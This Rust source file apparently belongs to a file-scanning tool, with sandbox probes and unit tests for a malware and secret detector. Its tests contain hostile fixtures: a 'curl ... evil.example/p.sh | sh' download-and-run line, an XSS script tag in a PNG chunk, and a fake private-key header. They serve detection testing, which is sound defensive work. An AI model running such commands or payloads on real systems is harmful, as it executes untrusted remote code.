    // Outside Linux and macOS there is no sandbox: the probes honestly show ALLOWED.
    #[cfg(not(target_os = "linux"))]
    let _ = with_seccomp;
    #[cfg(target_os = "linux")]
    {
        let lim = crate::sandbox_linux::ResourceLimits {
            mem_bytes: 512 << 20,
            cpu_secs: 10,
        };
        if let Err(e) = crate::sandbox_linux::apply_layers(&lim, with_seccomp) {
            println!("probe={probe} result=ERROR detail={e}");
            std::process::exit(3);
        }
    }
    #[cfg(target_os = "macos")]
    {
        let lim = crate::sandbox_macos::ResourceLimits {
            mem_bytes: 512 << 20,
            cpu_secs: 10,
        };
        if let Err(e) = crate::sandbox_macos::apply(&lim) {
            println!("probe={probe} result=ERROR detail={e}");
            std::process::exit(3);
        }
    }
    // A file an ordinary process could read: macOS has no `/etc/hostname`.
    let readable = if cfg!(target_os = "macos") {
        "/etc/hosts"
    } else {
        "/etc/hostname"
    };
    let program = if cfg!(target_os = "macos") {
        "/usr/bin/true"
    } else {
        "/bin/true"
    };
    let arg = arg.unwrap_or("");
    let out: (bool, String) = match probe {
        "read_file" => match std::fs::read(readable) {
            Ok(b) => (false, format!("read {} bytes", b.len())),
            Err(e) => (true, e.to_string()),
        },
        "read_path" => match std::fs::read(arg) {
            Ok(b) => (false, format!("read {} bytes", b.len())),
            Err(e) => (true, e.to_string()),
        },
        "write_path" => match std::fs::write(arg, b"x") {
            Ok(()) => (false, "wrote a file".into()),
            Err(e) => (true, e.to_string()),
        },
        "connect" => match std::net::TcpStream::connect(arg) {
            Ok(_) => (false, "connected".into()),
            Err(e) => (true, e.to_string()),
        },
        "list_dir" => match std::fs::read_dir("/") {
            Ok(_) => (false, "listed /".into()),
            Err(e) => (true, e.to_string()),
        },
        "write_file" => {
            let p =
                std::env::temp_dir().join(format!("antenna-files-selftest-{}", std::process::id()));
            match std::fs::write(&p, b"x") {
                Ok(()) => {
                    let _ = std::fs::remove_file(&p);
                    (false, "wrote a file".into())
                }
                Err(e) => (true, e.to_string()),
            }
        }
        "env" => {
            // Names only, never values: a value could be a secret, and this line goes to logs. The daemon starts the
            // worker with an empty environment; what the system sets in the process itself is listed separately.
            let (own, other): (Vec<_>, Vec<_>) = std::env::vars_os()
                .partition(|(k, v)| set_by_the_system(&k.to_string_lossy(), &v.to_string_lossy()));
            let names = |v: &[(std::ffi::OsString, std::ffi::OsString)]| {
                v.iter()
                    .map(|(k, _)| k.to_string_lossy().into_owned())
                    .collect::<Vec<_>>()
                    .join(" ")
            };
            (
                other.is_empty(),
                format!(
                    "{} environment variables [{}]; set by the system in this process: [{}]",
                    other.len(),
                    names(&other),
                    names(&own)
                ),
            )
        }
        "big_alloc" => {
            // Above the memory limit: the allocator gets a refusal, the process crashes (SIGABRT) but does not eat the
            // machine's memory.
            let v: Vec<u8> = vec![1u8; 2 << 30];
            (false, format!("allocated {}", v.len()))
        }
        "cpu_loop" => {
            // Infinite loop: RLIMIT_CPU (10 s) kills the process with SIGXCPU/SIGKILL.
            let mut x: u64 = 0;
            loop {
                x = std::hint::black_box(x.wrapping_add(1));
            }
        }
        "udp" => match std::net::UdpSocket::bind("127.0.0.1:0") {
            Ok(_) => (false, "socket created".into()),
            Err(e) => (true, e.to_string()),
        },
        "tcp" => match std::net::TcpStream::connect("1.1.1.1:443") {
            Ok(_) => (false, "connected".into()),
            Err(e) => (true, e.to_string()),
        },
        "exec" => match std::process::Command::new(program).status() {
            Ok(s) => (false, format!("ran {program}: {s}")),
            Err(e) => (true, e.to_string()),
        },
        "thread" => match std::thread::Builder::new().spawn(|| 1).map(|h| h.join()) {
            Ok(_) => (false, "thread ran".into()),
            Err(e) => (true, e.to_string()),
        },
        _ => {
            println!("probe={probe} result=ERROR detail=unknown probe");
            std::process::exit(2);
        }
    };
    println!(
        "probe={probe} result={} detail={}",
        if out.0 { "blocked" } else { "ALLOWED" },
        out.1
    );
    std::process::exit(0);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scanner(t: &str) -> Vec<&'static str> {
        if t.contains("PRIVATE KEY-----") {
            vec!["private_key"]
        } else {
            vec![]
        }
    }

    fn run(data: &[u8], name: &str) -> WorkerResponse {
        let req = WorkerRequest {
            v: 0,
            size: data.len() as u64,
            name: name.into(),
            preview: true,
            pixels: true,
            mem_bytes: 1 << 30,
            cpu_secs: 10,
            extra_rules: None,
        };
        let ctx = AnalyzeCtx {
            scanner,
            #[cfg(feature = "yara")]
            yara: None,
            #[cfg(not(feature = "yara"))]
            _p: std::marker::PhantomData,
            limits: cdr::Limits::default(),
            max_deep: 1 << 20,
        };
        analyze(&mut &data[..], &req, &ctx)
    }

    /// A generated image with XMP and content credentials (C2PA `caBX`) before its pixels is clean, with its preview
    /// rebuilt from the pixels; the same image with a text chunk that is HTML stays a threat (D-129).
    #[test]
    fn a_generated_png_with_xmp_and_content_credentials_is_clean() {
        let png = crate::detect::tests::generated_png(&[]);
        let r = run(&png, "AppIcon-transparent.png");
        assert_eq!(r.report.verdict, Verdict::Clean, "{:?}", r.report.findings);
        assert_eq!(r.report.kind, Kind::Png);
        let p = r.preview.expect("an image preview");
        assert_eq!(p.kind, crate::report::PreviewKind::Image);
        assert_eq!((p.images[0].width, p.images[0].height), (1, 1));
        let mut chunk = 25u32.to_be_bytes().to_vec();
        chunk.extend_from_slice(b"tEXtComment\0<script>alert(1)</script>");
        let mut crc = flate2::Crc::new();
        crc.update(&chunk[4..]);
        chunk.extend_from_slice(&crc.sum().to_be_bytes());
        let r = run(
            &crate::detect::tests::generated_png(&[chunk]),
            "AppIcon-transparent.png",
        );
        assert_eq!(r.report.verdict, Verdict::Threat, "{:?}", r.report.findings);
        assert!(r.report.findings.iter().any(|f| f.code == "polyglot_html"));
    }

    #[test]
    fn eicar_without_yara() {
        let r = run(EICAR, "eicar.txt");
        assert_eq!(r.report.verdict, Verdict::Threat);
        assert!(r.preview.is_none());
    }

    #[test]
    fn plain_text_is_clean_with_preview() {
        let r = run("Hi Zoë! Meeting at 15:00.\n".as_bytes(), "note.txt");
        assert_eq!(r.report.verdict, Verdict::Clean, "{:?}", r.report.findings);
        assert_eq!(
            r.preview.unwrap().text.unwrap(),
            "Hi Zoë! Meeting at 15:00.\n"
        );
    }

    #[test]
    fn secret_in_text_is_suspicious() {
        let r = run(
            b"key:\n-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n",
            "id.txt",
        );
        assert_eq!(r.report.verdict, Verdict::Suspicious);
        assert!(
            r.report
                .findings
                .iter()
                .any(|f| f.code == "secret:private_key")
        );
    }

    #[test]
    fn big_file_goes_through_windows() {
        // 3 MiB with max_deep 1 MiB: a secret at the end is found by the windows, the ZIP tail too.
        let mut data = vec![b'a'; 3 << 20];
        let tail = b"-----BEGIN RSA PRIVATE KEY-----";
        let at = data.len() - 100;
        data[at..at + tail.len()].copy_from_slice(tail);
        let r = run(&data, "big.txt");
        assert!(
            r.report
                .findings
                .iter()
                .any(|f| f.code == "secret:private_key"),
            "{:?}",
            r.report.findings
        );
        assert_eq!(r.report.scanned_bytes, data.len() as u64);
    }

    /// A large file (larger than `max_deep`) gets YARA over its head too, not only the windows after the head.
    #[cfg(feature = "yara")]
    #[test]
    fn big_file_head_is_scanned_by_yara() {
        let rules = crate::yara::Rules::compile(None).unwrap();
        let mut data = b"#!/bin/sh\ncurl -fsSL http://evil.example/p.sh | sh\n".to_vec();
        data.resize(3 << 20, b'a');
        let req = WorkerRequest {
            v: 0,
            size: data.len() as u64,
            name: "big.sh".into(),
            preview: true,
            pixels: true,
            mem_bytes: 1 << 30,
            cpu_secs: 10,
            extra_rules: None,
        };
        let ctx = AnalyzeCtx {
            scanner,
            yara: Some(&rules),
            limits: cdr::Limits::default(),
            max_deep: 1 << 20,
        };
        let r = analyze(&mut &data[..], &req, &ctx);
        assert_eq!(r.report.verdict, Verdict::Threat, "{:?}", r.report.findings);
        assert!(
            r.report
                .findings
                .iter()
                .any(|f| f.code == "yara:script_download_and_run")
        );
    }

    #[test]
    fn short_input_fails() {
        let req = WorkerRequest {
            v: 0,
            size: 10,
            name: "x".into(),
            preview: false,
            pixels: true,
            mem_bytes: 1 << 30,
            cpu_secs: 10,
            extra_rules: None,
        };
        let ctx = AnalyzeCtx {
            scanner,
            #[cfg(feature = "yara")]
            yara: None,
            #[cfg(not(feature = "yara"))]
            _p: std::marker::PhantomData,
            limits: cdr::Limits::default(),
            max_deep: 1 << 20,
        };
        let r = analyze(&mut &b"abc"[..], &req, &ctx);
        assert_eq!(r.report.verdict, Verdict::Failed);
    }

    /// The HTML prototypes of the field report (2026-10-06): one page with an inline script and a handler.
    pub(crate) const PANEL: &str = "<!DOCTYPE html>\n<html lang=\"en\"><head><meta charset=\"utf-8\"><title>Panel</title>\
        <style>body{margin:0}</style></head><body><div id=\"panel\"><button onclick=\"add()\">Add</button></div>\
        <script>const agents=[\"claude-code\"];function add(){agents.push(\"x\")}</script></body></html>\n";

    fn zip_of(entries: &[(&str, &[u8])], method: zip::CompressionMethod) -> Vec<u8> {
        use std::io::Write as _;
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        for (n, d) in entries {
            w.start_file(
                *n,
                zip::write::SimpleFileOptions::default().compression_method(method),
            )
            .unwrap();
            w.write_all(d).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    /// Sets the "encrypted" bit of every entry (local and central headers): the content stays readable bytes, but no
    /// reader may open it without a password, so it counts as not opened.
    fn mark_encrypted(mut z: Vec<u8>) -> Vec<u8> {
        let mut i = 0;
        while i + 10 < z.len() {
            if z[i..].starts_with(b"PK\x03\x04") {
                z[i + 6] |= 1;
            } else if z[i..].starts_with(b"PK\x01\x02") {
                z[i + 8] |= 1;
            }
            i += 1;
        }
        z
    }

    fn class(r: &WorkerResponse) -> (ContentClass, bool) {
        (r.report.class.unwrap(), r.report.uninspected)
    }

    fn codes(r: &WorkerResponse) -> Vec<&str> {
        r.report.findings.iter().map(|f| f.code.as_str()).collect()
    }

    /// What matched in the field report, reproduced: a stored ZIP of the prototypes is a threat by `polyglot_html` (the
    /// first member's markup lies in the archive's first KiB), the same ZIP deflated is clean, the pages as `.txt` are
    /// HTML by content with `active_content`. All three are code and markup, every member inspected (D-130).
    #[test]
    fn the_field_report_files_are_code_and_markup() {
        let stored = zip_of(
            &[
                ("panel-prototypes/panel-1.html", PANEL.as_bytes()),
                ("panel-prototypes/panel-2.html", PANEL.as_bytes()),
            ],
            zip::CompressionMethod::Stored,
        );
        let r = run(&stored, "panel-prototypes-2026-10-06.zip");
        assert_eq!(r.report.verdict, Verdict::Threat, "{:?}", codes(&r));
        assert!(codes(&r).contains(&"polyglot_html"), "{:?}", codes(&r));
        assert_eq!(class(&r), (ContentClass::Code, false));
        let deflated = zip_of(
            &[("panel-1.html", PANEL.as_bytes())],
            zip::CompressionMethod::Deflated,
        );
        let r = run(&deflated, "p.zip");
        assert_eq!(r.report.verdict, Verdict::Clean, "{:?}", codes(&r));
        assert_eq!(class(&r), (ContentClass::Code, false));
        let r = run(PANEL.as_bytes(), "panel-1.txt");
        assert_eq!(r.report.verdict, Verdict::Suspicious);
        assert_eq!(codes(&r), ["active_content"]);
        assert_eq!(class(&r), (ContentClass::Code, false));
        // Prose stays text; a script by `#!` is code whatever its name; a name says code only for text
        assert_eq!(
            class(&run(b"meeting at 3\n", "notes.txt")),
            (ContentClass::Text, false)
        );
        assert_eq!(
            class(&run(b"x = 1\n", "main.py")),
            (ContentClass::Code, false)
        );
        assert_eq!(
            class(&run(b"#!/bin/sh\necho hi\n", "notes")),
            (ContentClass::Code, false)
        );
        assert_eq!(
            class(&run(b"\x00\x01\x02\x03binary", "main.py")),
            (ContentClass::Other, false)
        );
    }

    #[test]
    fn archives_are_classed_by_every_member() {
        let elf = b"\x7FELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00rest-of-the-binary";
        let r = run(
            &zip_of(
                &[("bin/antennad", elf), ("README.md", b"# hi\n")],
                zip::CompressionMethod::Deflated,
            ),
            "build.zip",
        );
        assert_eq!(class(&r), (ContentClass::Executable, false));
        assert!(
            codes(&r).contains(&"archive_member_executable"),
            "{:?}",
            codes(&r)
        );
        assert_eq!(
            r.report.verdict,
            Verdict::Clean,
            "below level 5 nothing changes: {:?}",
            codes(&r)
        );
        let pkg = b"xar!\x00\x1c\x00\x01rest-of-the-package";
        let r = run(
            &zip_of(&[("Setup.pkg", pkg)], zip::CompressionMethod::Deflated),
            "setup.zip",
        );
        assert_eq!(class(&r), (ContentClass::Installer, false));
        assert!(codes(&r).contains(&"archive_member_installer"));
        // A nested archive is not opened (depth 1); an encrypted member cannot be
        let inner = zip_of(
            &[("a.js", b"let a = 1;\n")],
            zip::CompressionMethod::Deflated,
        );
        let r = run(
            &zip_of(
                &[("inner.zip", &inner), ("b.js", b"let b;\n")],
                zip::CompressionMethod::Deflated,
            ),
            "outer.zip",
        );
        assert_eq!(class(&r), (ContentClass::Code, true));
        assert!(codes(&r).contains(&"archive_member_unopened"));
        let enc = mark_encrypted(zip_of(
            &[("a.js", b"let a = 1;\n")],
            zip::CompressionMethod::Stored,
        ));
        let r = run(&enc, "secret.zip");
        assert!(r.report.uninspected, "{:?}", codes(&r));
        assert!(codes(&r).contains(&"archive_encrypted"));
        // Mixed content: other, every member opened
        let png = b"\x89PNG\r\n\x1a\n\x00\x00\x00\x0dIHDR";
        let r = run(
            &zip_of(
                &[("index.html", PANEL.as_bytes()), ("logo.png", png)],
                zip::CompressionMethod::Deflated,
            ),
            "site.zip",
        );
        assert_eq!(class(&r), (ContentClass::Other, false));
        // A document inside is a document, not a nested folder
        let r = run(
            &zip_of(&[("a.docx", &inner)], zip::CompressionMethod::Deflated),
            "docs.zip",
        );
        assert_eq!(class(&r), (ContentClass::Other, false));
    }

    #[test]
    fn tar_and_gzip_members_are_opened_too() {
        fn tar_of(entries: &[(&str, &[u8])]) -> Vec<u8> {
            let mut t = Vec::new();
            for (name, data) in entries {
                let mut h = vec![0u8; 512];
                h[..name.len()].copy_from_slice(name.as_bytes());
                h[100..108].copy_from_slice(b"0000644\0");
                h[124..136].copy_from_slice(format!("{:011o}\0", data.len()).as_bytes());
                h[156] = b'0';
                h[257..263].copy_from_slice(b"ustar\0");
                h[148..156].copy_from_slice(b"        ");
                let sum: u32 = h.iter().map(|b| *b as u32).sum();
                h[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
                t.extend_from_slice(&h);
                t.extend_from_slice(data);
                t.resize(t.len().div_ceil(512) * 512, 0);
            }
            t.extend(vec![0u8; 1024]);
            t
        }
        let t = tar_of(&[
            ("site/index.html", PANEL.as_bytes()),
            ("site/app.js", b"let a;\n"),
        ]);
        let r = run(&t, "site.tar");
        assert_eq!(class(&r), (ContentClass::Code, false), "{:?}", codes(&r));
        // A tar of HTML has the markup in its first KiB as well
        assert!(codes(&r).contains(&"polyglot_html"), "{:?}", codes(&r));
        let gz = |data: &[u8]| {
            use std::io::Write as _;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
            e.write_all(data).unwrap();
            e.finish().unwrap()
        };
        let r = run(&gz(&t), "site.tar.gz");
        assert_eq!(class(&r), (ContentClass::Code, false), "{:?}", codes(&r));
        // Compressed, the markup is not in the first KiB; a `.js` member is a script by its name, as before
        assert_eq!(r.report.verdict, Verdict::Suspicious, "{:?}", codes(&r));
        assert_eq!(codes(&r), ["executable_entry", "archive"]);
        let elf = b"\x7FELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00rest";
        let r = run(
            &gz(&tar_of(&[("antenna/antennad", elf)])),
            "antenna-linux.tar.gz",
        );
        assert_eq!(
            class(&r),
            (ContentClass::Executable, false),
            "{:?}",
            codes(&r)
        );
        let r = run(&gz(b"#!/bin/sh\necho hi\n"), "install.sh.gz");
        assert_eq!(class(&r), (ContentClass::Code, false), "{:?}", codes(&r));
    }

    #[test]
    fn executables_and_installers_by_their_format() {
        let elf = b"\x7FELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        assert_eq!(
            class(&run(elf, "antennad")),
            (ContentClass::Executable, false)
        );
        assert_eq!(
            class(&run(b"MZ\x90\x00\x03\x00", "setup.exe")),
            (ContentClass::Executable, false)
        );
        assert_eq!(
            class(&run(b"\xCF\xFA\xED\xFE\x07\x00", "antenna")),
            (ContentClass::Executable, false)
        );
        let r = run(b"xar!\x00\x1c\x00\x01", "Antenna.pkg");
        assert_eq!(class(&r), (ContentClass::Installer, false));
        assert!(codes(&r).contains(&"installer_package"), "{:?}", codes(&r));
        assert_eq!(
            class(&run(b"\xED\xAB\xEE\xDB\x03\x00", "a.rpm")),
            (ContentClass::Installer, false)
        );
        // Unrecognized content is an installer only when named as one
        assert_eq!(
            class(&run(b"\x00\x01\x02\x03\x04", "disk.iso")),
            (ContentClass::Installer, false)
        );
        assert_eq!(
            class(&run(b"\x00\x01\x02\x03\x04", "data.bin")),
            (ContentClass::Other, false)
        );
    }
}
